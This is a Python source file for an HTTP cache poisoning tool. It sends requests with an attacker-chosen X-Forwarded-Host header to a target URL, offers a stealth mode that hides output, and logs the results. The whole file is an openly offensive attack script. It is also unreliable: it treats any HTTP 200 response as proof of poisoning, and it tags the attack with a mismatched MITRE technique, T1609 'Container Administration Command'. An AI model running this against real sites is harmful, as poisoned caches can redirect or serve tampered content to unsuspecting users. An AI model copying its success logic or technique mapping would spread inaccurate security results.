# modules/exploits/http_cache_poisoner.py

import argparse
import requests
import json
import os
from datetime import datetime
from urllib.parse import urlparse

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1609"  # Container Administration Command (Cache Poisoning)

def log_poison(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def poison_cache(target_url, injection_payload, stealth):
    headers = {
        "X-Forwarded-Host": injection_payload,
        "Cache-Control": "max-age=3600"
    }

    try:
        r = requests.get(target_url, headers=headers, timeout=10)
        success = "poison" in r.text.lower() or r.status_code == 200

        if not stealth:
            print(f"[âœ“] Response received: {r.status_code}")
            print(r.text[:250])

        log_poison({
            "timestamp": datetime.utcnow().isoformat(),
            "target": target_url,
            "payload": injection_payload,
            "response_status": r.status_code,
            "cache_poisoned": success,
            "ttp": MITRE_TTP
        })

    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Cache Poisoning Payload Injector")
    parser.add_argument("--url", required=True, help="Target URL to poison")
    parser.add_argument("--payload", required=True, help="Injected hostname (X-Forwarded-Host)")
    parser.add_argument("--stealth", action="store_true", help="Suppress output")
    args = parser.parse_args()

    poison_cache(args.url, args.payload, args.stealth)
